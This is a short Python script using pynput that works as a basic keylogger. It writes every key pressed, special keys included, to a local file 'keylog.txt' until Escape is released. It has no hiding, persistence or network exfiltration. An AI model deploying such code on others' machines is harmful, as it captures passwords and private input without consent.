from pynput import keyboard

# Define a file to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Write the alphanumeric key to the file with a newline
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Write special keys (e.g., space, enter) to the file with a newline
        with open(log_file, "a") as f:
            f.write(f"[{key}]\n")

def on_release(key):
    # Stop listener with the escape key
    if key == keyboard.Key.esc:
        return False

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

